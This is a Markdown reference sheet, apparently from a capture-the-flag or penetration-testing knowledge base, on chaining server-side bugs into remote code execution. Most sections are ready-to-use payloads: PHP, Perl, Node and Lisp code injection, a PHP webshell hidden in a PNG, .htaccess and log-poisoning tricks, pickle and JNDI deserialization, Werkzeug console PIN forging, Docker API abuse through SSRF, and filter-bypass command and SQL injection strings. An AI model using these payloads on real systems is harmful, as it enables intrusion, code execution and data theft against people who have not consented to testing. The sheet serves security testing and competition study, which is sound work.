# Server-Side Execution and Advanced Chains

Use this reference for server-side code execution, deserialization, upload-to-RCE, dangerous framework CVEs, and deep exploit chains after a server-side sink is confirmed.

## Table of Contents
- [Fast triage](#fast-triage)
- [Language and runtime injection](#language-and-runtime-injection)
- [Uploads and post-processing](#uploads-and-post-processing)
- [Deserialization](#deserialization)
- [Framework and product chains](#framework-and-product-chains)
- [Race conditions (TOCTOU)](#race-conditions-toctou)
- [Command-injection quoting tricks](#command-injection-quoting-tricks)
- [SQLi-to-RCE bypass fragments](#sqli-to-rce-bypass-fragments)
- [When to stop](#when-to-stop)

## Fast triage

Once a server-side sink is real, classify execution path:
1. direct language eval / template execution
2. shell or subprocess wrapper
3. file upload into executable or interpreted path
4. deserialization / gadget chain
5. framework or product-specific CVE chain

Prefer smallest reliable proof:
- file read,
- one command,
- DNS/HTTP callback,
- single artifact write.

## Language and runtime injection

High-yield families:
- Ruby `instance_eval`, `ObjectSpace`, `Kernel#open`
- PHP `preg_replace /e`, `assert`, backticks, `eval`, `extract`
- Perl 2-arg `open()`
- LaTeX `\input{|"cmd"}`
- server-side JS `constructor.constructor` / `eval` blocklist bypass
- Common Lisp / Prolog / Python format or f-string injection
- ReDoS as timing oracle when direct output is absent

Rule:
- fingerprint runtime from source, headers, stack traces, file extensions, or error shapes before payload iteration.

**Ready-to-fire per-runtime recipes:**

- **Ruby `instance_eval` in string context** — break out with `VALID'); INJECTED#`. `ObjectSpace.each_object(String).each{|s| puts s if s=~/CTF/}` dumps every live string in memory (flag included) — the go-to when output channels are otherwise blocked.
- **Perl 2-arg `open()`** allows shell via `|`: `open(FH, "|cmd|")` — any user-controlled filename passed to 2-arg open is RCE.
- **PHP backtick shell_exec** in short-payload contexts: `` echo`cat *`; `` fits RCE in ~8 chars; `` `$_GET[0]`; `` moves the payload out to the query string when the sink accepts only a short body.
- **PHP `assert()` injection** (< 7.2): `assert("strpos('$in', '..') === false")` → send `in=') || system('id');//`.
- **JS `eval` / blocklist bypass**: rebuild `Function` via `constructor.constructor` through property-name concatenation — `(1)["con"+"structor"]["con"+"structor"]("return process")()` in Node yields the `process` object.
- **Common Lisp `read` injection**: `#.(run-shell-command "id")` — the reader macro evaluates *at parse time*, before your value is even bound.
- **LaTeX `\input{|"cmd"}`** shells out when `-shell-escape` is enabled; `\@@input"/etc/passwd"` reads files with no shell. **`write18` bypass** when the LaTeX runner restricts shell escape: `mpost -ini "-tex=bash -c (cmd)" file.mp` — mpost is whitelisted and re-invokes TeX with an arbitrary program. Use `${IFS}` in place of literal spaces to survive sanitizers.

## Uploads and post-processing

Model full upload path:
- validation point
- storage key
- serving path and MIME
- unpackers / converters / scanners / metadata readers

Common win routes:
- double-extension and MIME mismatch
- `.htaccess` or server config influence
- polyglots
- ZIP slip, symlink archives, or filename injection
- metadata processor CVEs such as ExifTool
- attachment or PDF generators turning fetch into SSRF/file-read

**High-yield concrete patterns:**

- **`.htaccess` upload** → `AddType application/x-httpd-php .lol` + `webshell.lol` webshell (works when Apache honors uploaded `.htaccess`; requires `AllowOverride FileInfo`). Related: **Apache `ErrorDocument` file read** — `.htaccess` with `ErrorDocument 404 "%{file:/etc/passwd}"` reads files at Apache-level expression evaluation, bypassing `php_admin_flag engine off`. Trigger with any 404 request.
- **PNG/PHP polyglot + double extension**: valid PNG with `<?php system($_GET[0]); ?>` after the `IEND` chunk, uploaded as `image.png.php` (Apache maps by last extension). When `disable_functions` blocks `system/exec`, chain `scandir('/')` + `file_get_contents('/flag')` for read-only wins.
- **ZIP upload with PHP webshell**: extract to a web-served directory → request the webshell URL → `file_get_contents('/flag')`. Combine with **ZipSlip** (symlink inside the archive) for arbitrary file read/write during extraction.
- **Gogs symlink escape**: overwrite `.git/config` with `[core] sshCommand = <cmd>` — every subsequent SSH-invoking Git op executes the command as the Gogs user.
- **Python `.so` hijack**: upload a malicious `.so` to a directory in the interpreter's search path, delete the corresponding `.pyc` to force re-import, and the next `import` triggers loader-time execution.
- **Log poisoning + LFI**: put a PHP payload in `User-Agent`, then include the access log through LFI — `?page=/var/log/apache2/access.log` → the payload runs when PHP parses the log.

## Deserialization

Check language first, then gadget ecosystem.

Common classes:
- Java serialized objects and ysoserial chains
- Java JNDI injection (Log4Shell, Spring, Shiro) via LDAP/RMI references
- Python pickle abuse
- PHP object injection in cookies/sessions
- unsafe JSON-to-object binders with magic methods

### JNDI vs classic deserialization

JNDI injection (e.g., Log4Shell) is distinct from classic `readObject()` deserialization:
- **Classic deserialization**: attacker controls serialized bytes → gadget chain executes in `readObject()`. Use ysoserial.
- **JNDI Reference attack**: attacker controls LDAP/RMI lookup URL → response delivers factory class invocation via `NamingManager.getObjectInstance()`. Does NOT require deserialization gadgets — needs factory on local classpath (e.g., Tomcat's `BeanFactory`).

Key rule: if target makes LDAP callback but shell doesn't pop, check whether you're sending `javaSerializedData` (wrong for BeanFactory) vs `javaReferenceAddress` (correct for BeanFactory). These are fundamentally different execution paths.

Minimal approach:
- start with blind DNS or timing gadget if execution proof is noisy,
- for JNDI: confirm callback first (LDAP/DNS), then iterate payload type,
- move to file read or command exec only when gadget compatibility is proven.

Detection hex prefixes: Java serialized objects start with `aced 0005` (base64: `rO0AB`); JBoss remote invocation `aced 0005 7372`. `URLDNS` is the quietest blind detector.

### Castor XML `xsi:type` deserialization

Castor `Unmarshaller` used without a mapping file trusts `xsi:type` attributes to instantiate arbitrary Java classes. Chain with ysoserial `CommonsBeanutils1` for RCE via JNDI/RMI. Java 11 works; Java 17+ blocks module access. Fingerprint via `pom.xml` (`castor-xml`) or `castor.properties` on the classpath.

### Python pickle chaining via STOP-opcode stripping

`pickle.loads()` executes every `REDUCE` opcode until it hits `STOP` (`\x2e`). Strip the `STOP` from a first `__reduce__` payload and concatenate a second — both callables execute in a single `loads()`. Useful for chaining `os.dup2()` (socket redirect) with a follow-up command in the same deserialization pass.

### PHP serialization length manipulation via filter-word expansion

When a post-serialization string filter replaces a short token with a longer one (`"where"` → `"hacker"`, +1 byte), repeat `"where"` N times so the total byte shift overflows into the next serialized field, letting you smuggle a full field: `";}s:5:"photo";s:10:"config.php";}`. The expansion count is deterministic — compute the exact number of repeats for your target field boundary.

## Framework and product chains

These often collapse multi-step exploitation.

Examples worth testing quickly when stack matches:
- Flask / Werkzeug debug exposure
- WeasyPrint SSRF / local file read
- ExifTool DjVu injection
- Next.js / React / Node edge-case CVEs that change trust boundaries
- upload processors, CI panels, admin consoles, or internal document services

Operator rule:
- product-specific CVEs belong here only when the stack is fingerprinted; do not spray every CVE blindly.

**Flask / Werkzeug debug**: weak `SECRET_KEY` (rockyou) → forge admin session (`flask-unsign --sign`) → land on `/console` → compute Werkzeug PIN from `getpass.getuser()`, `flask.app`, `getattr(mod,'__file__',None)`, `uuid.getnode()`, `get_machine_id()` (`/etc/machine-id` or `/proc/self/cgroup`) → interactive Python RCE.

**WeasyPrint attachment SSRF / file read**: PDF-generation input that includes `<a rel="attachment" href="file:///flag">` or `<link rel="attachment" href="http://127.0.0.1/admin">` embeds the fetched content as a PDF attachment — bypasses header-only URL checks. Boolean oracle: search the returned PDF for `/Type /EmbeddedFile`.

**ElasticSearch Groovy RCE via SSRF** (< 5.0): SSRF into internal ES on `:9200` → `POST /_search` with `script_fields` containing a Groovy `Runtime.getRuntime().exec(...)` script — no auth needed pre-5.0.

**SSRF → Docker API RCE chain**: unauthenticated Docker daemon on `:2375` reachable via SSRF: `POST /containers/{id}/archive?path=/` uploads a tar into a container; `POST /containers/{id}/exec` + `POST /exec/{id}/start` runs commands. When SSRF is GET-only, relay through an internal POST proxy.

**Pongo2 / Go template `{% include %}`**: upload a controlled file, then a template parameter with path traversal (`{% include "../../uploads/x" %}`) forces the renderer to include the upload — exec inside the template context.

**React Server Components / Next.js Flight protocol** (CVE-2025-55182): fingerprint via `Next-Action` header, `Accept: text/x-component`, Flight payloads, App Router server actions. When positive, verify with the smallest safe echo (controlled redirect, callback, container-local file read) — this is a serialization-lane CVE, not a blind RCE. Full CVE context in `web-vulnerabilities-and-cves.md`.

## Race conditions (TOCTOU)

Check-then-act flows (balance debit, coupon single-use, invite claim, registration, quota consumption) are usually pre-decrement. Fire 20–100 simultaneous requests with a warm connection pool (`ffuf` `-mc all` with concurrent workers, `curl` in a `xargs -P` loop, or a Python `asyncio.gather` batch) — all requests read the pre-modified state and each succeeds independently.

Signals of racing being possible: no advisory lock in the code path, redis `SETNX`/DB `SELECT ... FOR UPDATE` absent, per-user rate limit enforced *after* the write, or explicit "reload latest balance" only on error paths. HTTP/2 single-packet attack (Burp `Turbo Intruder`) synchronizes request arrival within microseconds — the reliability upgrade over parallel HTTP/1.1.

## Command-injection quoting tricks

One-byte separators (`;`, `|`, `&`, backtick, `$()`) are the baseline. When those are filtered:

- **`%0a` newline injection**: filters that reject `;|&<>` often forget LF; `127.0.0.1%0acat /flag` decodes to a newline that terminates the outer command. Especially common in Git CLI wrappers that pass user input into backtick / `system()` calls.
- **Bash brace expansion** (space-free): `{ls,-la,/}` expands to `ls -la /` without literal spaces — bypasses filters that block `%20`/tabs.
- **`${IFS}`** substitutes for spaces where the shell splits on `$IFS`.
- **Alt readers when `cat`/`head` are blocked**: `sed -n p flag.txt`, `awk '{print}' flag.txt`, `tac flag.txt`, `xxd flag.txt`, `od -c flag.txt` — any of these usually survives command-name filters.

## SQLi-to-RCE bypass fragments

- **Keyword-fragmentation bypass** for single-pass `preg_replace()` filters: nest the stripped keyword inside the payload so the *result* of stripping is what you want — `unload_fileon` after removing `load_file` yields `union`. Same trick for `SELselectECT` → `SELECT`, `UNIunionON` → `UNION`.
- Full SQLi filter bank: see `sql-injection.md` (WAF bypass, magic-hash payloads, `information_schema.processlist` leak).

## When to stop

Stop at first reproducible objective proof:
- recovered secret,
- single command result,
- stable admin action,
- one validated SSRF/file-read/callback,
- one reliable deserialization gadget.

Do not keep escalating if objective is already solved.

## See also

- `server-injection.md` — upstream sinks, SSRF, XXE, LFI, parser abuse
- `web-vulnerabilities-and-cves.md` — web/product CVEs and browser-side issues
